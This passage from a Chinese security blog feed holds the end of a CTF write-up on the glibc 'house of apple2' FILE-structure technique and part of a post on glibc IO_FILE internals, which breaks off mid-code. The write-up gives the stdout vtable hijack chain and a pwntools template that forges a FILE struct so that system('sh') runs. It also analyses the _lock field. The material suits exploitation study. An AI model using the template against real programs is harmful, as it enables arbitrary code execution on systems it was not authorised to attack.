MEMBER)))</span></span><br></pre></td></tr></table></figure><p>它会通过宏展开调用到<code>_wide_vtable</code>指向的虚表中的<code>__overflow</code>指向的函数。而这个虚表没有检查，所以可以将<code>__overflow</code>指针改成ogg或者system函数，通过上述调用链，就能拿到shell了。想要修改函数指针，我们就需要将<code>_wide_vtable</code>指针成员改为可控地址，并在对应偏移处写上你想要劫持的函数即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">int</span> __overflow (FILE *, <span class="type">int</span>);</span><br></pre></td></tr></table></figure><p>根据函数原型可知函数的第一个参数是FILE指针本身，所以如果有参数，要写在flags位上，前面要加上两个空格。</p><h5 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h5><p>调用链如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">puts</span></span><br><span class="line">  _IO_XSPUTN（原解析） --&gt; _IO_wfile_seekoff（现解析）</span><br><span class="line">     _IO_switch_to_wget_mode</span><br><span class="line">        _IO_WOVERFLOW</span><br><span class="line">           *(fp-&gt;_wide_data-&gt;_wide_vtable + <span class="number">0x18</span>)(fp)</span><br></pre></td></tr></table></figure><p>要修改的东西如下(fp代指<code>_IO_2_1_stdout_-&gt;file</code>)：</p><ul><li><code>vtable </code>改成<code>_IO_wfile_jumps+0x10</code></li><li><code>fp -&gt; _wide_data</code>改成一个可控地址，这道题里直接改成了<code>_IO_2_1_stdout_</code></li><li><code>fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</code></li><li><code>fp -&gt; _wide_data -&gt; _wide_vtable</code>改成一个可控地址,这道题里改成了<code>_IO_2_1_stdout_-8</code></li><li><code>fp -&gt; _wide_data -&gt; _wide_vtable -&gt; overflow</code>改成ogg或system</li></ul><h4 id="板子"><a href="#板子" class="headerlink" title="板子"></a>板子</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fake_file = flat(&#123;</span><br><span class="line">    <span class="number">0x0</span>: <span class="string">b&#x27;  sh;&#x27;</span>,</span><br><span class="line">    <span class="number">0x10</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]),</span><br><span class="line">    <span class="number">0x20</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line"></span><br><span class="line">    <span class="number">0x88</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_environ&#x27;</span>]-<span class="number">0x10</span>),  <span class="comment"># _lock</span></span><br><span class="line">    <span class="number">0xa0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]),</span><br><span class="line">    <span class="number">0xd8</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>] + <span class="number">0x10</span>),</span><br><span class="line">    <span class="number">0xe0</span>: p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]-<span class="number">8</span>),</span><br><span class="line">&#125;, filler=<span class="string">b&quot;\x00&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="关于-lock的一些思考"><a href="#关于-lock的一些思考" class="headerlink" title="关于_lock的一些思考"></a>关于_lock的一些思考</h4><p>每个师傅自己调的板子都会有些不太一样，有些师傅的wp里会给file中的<code>_lock</code>也写上一个值，有些没有，甚至每个板子写的lock地址还不一样。这个应该和题目或者是调用链有关。我想尝试从源码或者汇编中找出一些关于覆写_lock的必要性，奈何水平不够，没能分析出来个所以然，但是网上也没有多少师傅提到过这个成员，唯一能找到的说法是要给lock覆写一个可写地址。我尝试在这道题里随便写上一个堆地址，但是没能打通。下面大概讲讲我挣扎的过程，但是结论有待验证。</p><p>我们先来看看不给lock覆写值会发生什么。从脚本进行调试并且链接了源码调试。<img src="https://c-lby.top/images/2024deadsec_wp/apple2_lock%E6%97%A0%E8%A6%86%E5%86%99%E6%8A%A5%E9%94%99.png" alt="apple2_lock无覆写报错"></p><p>程序卡在一个<code>cmpxchg</code>的指令，对应的源码是和lock相关的。那个语句可以通过宏定义展开，但是我看的一头雾水，所以我选择去看看其对应的汇编语句。<img src="https://c-lby.top/images/2024deadsec_wp/IO_file_underflow.png" alt="_IO_file_underflow"></p><p>从0x8CAFB开始往下分析，首先将<code>_IO_2_1_stdout_</code>的地址赋给了r12，将flags与0x8000做与运算并根据结果选择分支；如果不满足跳转条件，则取出stdout+0x88也就是_lock处的内容赋给rdi，将fs+0x10（是一个指向tls结构体的指针）赋给了rbp，然后将<code>_lock</code>处内容+8后取出里面的内容和rbp做比较，然后分支可能就会进入到cmpxchg指令中。关于这个指令的解释网上<a href="https://coderatwork.cn/posts/linux-cmpxchg/">资料</a>有很多，简单来讲就是个比较交换的操作。</p><p>在上述这些步骤中，我们可以关注到关于这个lock至少需要满足这些要求：</p><ul><li>[_lock]可读</li><li>[_lock+8]可读</li><li>[[_lock]]可写</li></ul><p>其实也就是覆写上去的那个地址要可写。当然，这些条件不是在每个情况下都要满足，也不是在每道题都要写lock的，上述过程里是有几个条件判断分支的，所以要结合具体情况来分析到底需不需要写lock上去。</p><p>我并不确定我的分析是否正确，结论也只经过了少量验证，而且总有几率会-11报错终止程序，所以有待进一步分析。并且目前遇到了另一个奇怪的问题。_lock只被覆写了低两个字节，而高四个字节依然是libc的地址的高位（经过几次实验发现是<code>_IO_stdfile_1_lock</code>的地址高位）。如下，我写入一个堆地址，然而lock位上的地址只有两位被改变了。这个问题尚未找到原因。就这个情况而言，我们只能写一个和<code>_IO_stdfile_1_lock</code>很接近的地址才能行得通，堆地址是不行的。这样的话好像不如直接写固定偏移（0x21ca70）好了。（24.8.7）</p><p><img src="https://c-lby.top/images/2024deadsec_wp/%E5%86%99%E5%85%A5%E7%9A%84%E5%A0%86%E5%9C%B0%E5%9D%80.png" alt="写入的堆地址"></p><p>经过挣扎，又问了xf1les爷，终于找到答案了。这里用堆地址没法打通只是这道题用了gets函数来接收数据的原因。因为gets函数是逐字节读取数据的，这也就意味着地址会一个字节一个字节地写到lock上，然而写上去的过程中，gets会不断调用<code>_IO_acquire_lock(stdout)</code>，也就是从stdout这个fp中取出lock来用，而其中lock地址可能不是一个可读可写的地址，这就导致了程序会一直卡在cmpxchg这个指令上。如果是read函数，则这样的问题不会出现，堆地址是可以使用的。（24.8.10）</p><p>从另一个角度看，如果调用链和程序原本的函数没有使用到stdout的lock的话，我们甚至可以不用覆写lock。这也就是为什么有些师傅的板子里没有写lock。</p><h3 id="0x02-『LitCTF2024』2-39"><a href="#0x02-『LitCTF2024』2-39" class="headerlink" title="0x02 『LitCTF2024』2.39"></a>0x02 『LitCTF2024』2.39</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*To be continued...*/</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">学习和使用house of apple2的一些自己的理解。</summary>
    
    
    
    <category term="Heap Exploitation" scheme="https://c-lby.top/categories/Heap-Exploitation/"/>
    
    
    <category term="heap" scheme="https://c-lby.top/tags/heap/"/>
    
    <category term="CTF" scheme="https://c-lby.top/tags/CTF/"/>
    
    <category term="PWN" scheme="https://c-lby.top/tags/PWN/"/>
    
    <category term="IO_FILE" scheme="https://c-lby.top/tags/IO-FILE/"/>
    
  </entry>
  
  <entry>
    <title>『glibc源码补完计划』IO_FILE</title>
    <link href="https://c-lby.top/2024/07/30/glibc-IO/"/>
    <id>https://c-lby.top/2024/07/30/glibc-IO/</id>
    <published>2024-07-30T04:26:11.000Z</published>
    <updated>2024-08-07T15:02:47.557Z</updated>
    
    <content type="html"><![CDATA[<h3 id="相关数据结构"><a href="#相关数据结构" class="headerlink" title="相关数据结构"></a>相关数据结构</h3><h5 id="IO-FILE-plus"><a href="#IO-FILE-plus" class="headerlink" title="_IO_FILE_plus"></a>_IO_FILE_plus</h5><p><code>_IO_FILE_plus</code>定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  FILE file;</span><br><span class="line">  <span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span> *<span class="title">vtable</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>FILE</code>的定义是<code>typedef struct _IO_FILE FILE;</code></p><h5 id="IO-FILE"><a href="#IO-FILE" class="headerlink" title="_IO_FILE"></a>_IO_FILE</h5><p>我们查看<code>_IO_FILE</code>的定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;<span class="comment">/* High-order word is _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;<span class="comment">/* End of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_complete</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> _<span class="title">file</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="type">__off64_t</span> _offset;</span><br><span class="line">  <span class="comment">/* Wide character stream stuff.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_codecvt</span> *_<span class="title">codecvt</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> *_<span class="title">wide_data</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">freeres_list</span>;</span></span><br><span class="line">  <span class="type">void</span> *_freeres_buf;</span><br><span class="line">  <span class="type">size_t</span> __pad5;</span><br><span class="line">  <span class="type">int</span> _mode;</span><br><span class="line">  <span class="comment">/* Make sure we don&#x27;t get into trouble again.  */</span></span><br><span class="line">  <span class="type">char</span> _unused2[<span class="number">15</span> * <span class="keyword">sizeof</span> (<span class="type">int</span>) - <span class="number">4</span> * <span class="keyword">sizeof</span> (<span class="type">void</span> *) - <span class="keyword">sizeof</span> (<span class="type">size_t</span>)];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>_IO_FILE</code>在满足<code>_IO_USE_OLD_IO_FILE</code>的情况下才会转变完善为<code>_IO_FILE_complete</code>。一个进程中的所有FILE结构会通过<code>_chain</code>来连接成一个单向链表，并通过<code>_IO_list_all</code>来记录链表头部。而这个变量在进程一开始是直接指向<code>_IO_2_1_stderr_</code>的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> *_<span class="title">IO_list_all</span> =</span> &amp;_IO_2_1_stderr_;</span><br></pre></td></tr></table></figure><p>这里补充一个点，所有进程启动都会自动创建stdin、stdout、stderr三个FILE结构，存在libc.so的数据段中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">DEF_STDFILE(_IO_2_1_stdin_, <span class="number">0</span>, <span class="number">0</span>, _IO_NO_WRITES);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stdout_, <span class="number">1</span>, &amp;_IO_2_1_stdin_, _IO_NO_READS);</span><br><span class="line">DEF_STDFILE(_IO_2_1_stderr_, <span class="number">2</span>, &amp;_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);</span><br></pre></td></tr></table></figure><p>其他通过fopen等函数创建出来的FILE结构一般会被分配到堆中储存，而这些函数的返回值通常就是指向该FILE结构的指针。</p><h5 id="IO-jump-t-vtable"><a href="#IO-jump-t-vtable" class="headerlink" title="_IO_jump_t *vtable"></a>_IO_jump_t *vtable</h5><p><code>vtable</code>就是我们常说的虚表，他是一个重要的指针，指向一系列IO相关的函数指针。常规文件流的vtable类型为<code>_IO_jump_t</code>,定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="type">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在libc中定义的vtable有<code>_IO_file_jumps</code>, <code>_IO_str_jumps</code>, <code>_IO_cookie_jumps</code>等。</p><p>FILE头和vtable的偏移在64位下一般是xd8大小，整个<code>_IO_FILE_plus</code>结构体内部偏移如下：</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x0</span>   _flags</span><br><span class="line"><span class="number">0x8</span>   _IO_read_ptr</span><br><span class="line"><span class="number">0x10</span>  _IO_read_end</span><br><span class="line"><span class="number">0x18</span>  _IO_read_base</span><br><span class="line"><span class="number">0x20</span>  _IO_write_base</span><br><span class="line"><span class="number">0x28</span>  _IO_write_ptr</span><br><span class="line"><span class="number">0x30</span>  _IO_write_end</span><br><span class="line"><span class="number">0x38</span>  _IO_buf_base</span><br><span class="line"><span class="number">0x40</span>  _IO_buf_end</span><br><span class="line"><span class="number">0x48</span>  _IO_save_base</span><br><span class="line"><span class="number">0x50</span>  _IO_backup_base</span><br><span class="line"><span class="number">0x58</span>  _IO_save_end</span><br><span class="line"><span class="number">0x60</span>  _markers</span><br><span class="line"><span class="number">0x68</span>  _chain</span><br><span class="line"><span class="number">0x70</span>  _fileno</span><br><span class="line"><span class="number">0x74</span>  _flags2</span><br><span class="line"><span class="number">0x78</span>  _old_offset</span><br><span class="line"><span class="number">0x80</span>  _cur_column</span><br><span class="line"><span class="number">0x82</span>  _vtable_offset</span><br><span class="line"><span class="number">0x83</span>  _shortbuf</span><br><span class="line"><span class="number">0x88</span>  _lock</span><br><span class="line"><span class="number">0x90</span>  _offset</span><br><span class="line"><span class="number">0x98</span>  _codecvt</span><br><span class="line"><span class="number">0xa0</span>  _wide_data</span><br><span class="line"><span class="number">0xa8</span>  _freeres_list</span><br><span class="line"><span class="number">0xb0</span>  _freeres_buf</span><br><span class="line"><span class="number">0xb8</span>  __pad5</span><br><span class="line"><span class="number">0xc0</span>  _mode</span><br><span class="line"><span class="number">0xc4</span>  _unused2</span><br><span class="line"><span class="number">0xd8</span>  vtable</span><br></pre></td></tr></table></figure><h3 id="常用IO函数调用链分析"><a href="#常用IO函数调用链分析" class="headerlink" title="常用IO函数调用链分析"></a>常用IO函数调用链分析</h3><h5 id="fread"><a href="#fread" class="headerlink" title="fread"></a>fread</h5><p>函数原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> <span class="title function_">fread</span> <span class="params">(<span class="type">void</span> *__restrict __ptr, <span class="type">size_t</span> __size,<span class="type">size_t</span> __n, FILE *__restrict __stream)</span>;</span><br></pre></td></tr></table></figure><p>又有宏定义<code>#define fread(p, m, n, s) _IO_fread (p, m, n, s)</code>。于是我们追踪<code>_IO_fread</code>函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_fread (<span class="type">void</span> *buf, <span class="type">size_t</span> size, <span class="type">size_t</span> count, FILE *fp)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> bytes_requested = size * count;</span><br><span class="line">  <span class="type">size_t</span> bytes_read;</span><br><span class="line">  CHECK_FILE (fp, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (bytes_requested == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  bytes_read = _IO_sgetn (fp, (<span class="type">char</span> *) buf, bytes_requested);</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  <span class="keyword">return</span> bytes_requested == bytes_read ? count : bytes_read / size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_sgetn</code>函数（在genops.c中）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">_IO_sgetn (FILE *fp, <span class="type">void</span> *data, <span class="type">size_t</span> n)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* FIXME handle putback buffer here! */</span></span><br><span class="line">  <span class="keyword">return</span> _IO_XSGETN (fp, data, n);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>_IO_XSGETN</code>就是vtable中的函数指针之一，默认指向<code>_IO_file_xsgetn</code>。</p><h5 id="其他常见函数对应指针总结"><a href="#其他常见函数对应指针总结" class="headerlink" title="其他常见函数对应指针总结"></a>其他常见函数对应指针总结</h5><ul><li>printf&#x2F;puts -&gt;<code>_IO_XSPUTN</code>-&gt;_<code>IO_OVERFLOW</code></li><li>scanf&#x2F;gets -&gt; <code>_IO_XSGETN</code></li><li>fwrite -&gt; <code>_IO_XSPUTN</code>-&gt;<code>_IO_OVERFLOW</code></li><li>fread -&gt; <code>_IO_XSGETN</code></li><li>fclose -&gt; <code>_IO_FINISH</code></li><li>exit -&gt; <code>_IO_flush_all_lockp</code> -&gt;<code>_IO_OVERFLOW</code></li></ul><p>顺带一提，当我们用printf输出一个以换行符结尾的纯字符串的时候，printf会被优化成puts函数并去除换行符。</p><h5 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a>fopen</h5><p>我们顺便关注一下一个文件流被创建的过程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#   <span class="keyword">define</span> fopen(fname, mode) _IO_new_fopen (fname, mode)</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">FILE *</span><br><span class="line">__fopen_internal (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode, <span class="type">int</span> is32)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">locked_FILE</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE_plus</span> <span class="title">fp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">    _IO_lock_t lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">IO_wide_data</span> <span class="title">wd</span>;</span></span><br><span class="line">  &#125; *new_f = (<span class="keyword">struct</span> locked_FILE *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (<span class="keyword">struct</span> locked_FILE));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (new_f == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  new_f-&gt;fp.file._lock = &amp;new_f-&gt;lock;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  _IO_no_init (&amp;new_f-&gt;fp.file, <span class="number">0</span>, <span class="number">0</span>, &amp;new_f-&gt;wd, &amp;_IO_wfile_jumps);</span><br><span class="line">  _IO_JUMPS (&amp;new_f-&gt;fp) = &amp;_IO_file_jumps;</span><br><span class="line">  _IO_new_file_init_internal (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="keyword">if</span> (_IO_file_fopen ((FILE *) new_f, filename, mode, is32) != <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> __fopen_maybe_mmap (&amp;new_f-&gt;fp.file);</span><br><span class="line"></span><br><span class="line">  _IO_un_link (&amp;new_f-&gt;fp);</span><br><span class="line">  <span class="built_in">free</span> (new_f);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FILE *</span><br><span class="line">_IO_new_fopen (<span class="type">const</span> <span class="type">char</span> *filename, <span class="type">const</span> <span class="type">char</span> *mode)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __fopen_internal (filename, mode, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>函数被稍微封装了一下，回归到<code>__fopen_internal</code>函数。函数malloc了一块地址用来存放FILE，由此可知一般文件流的FILE是被放在堆上的。</p><p>接着用<code>_IO_no_init</code>函数和<code>_IO_JUMPS</code>初始化了vtable：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_no_init (FILE *fp, <span class="type">int</span> flags, <span class="type">int</span> 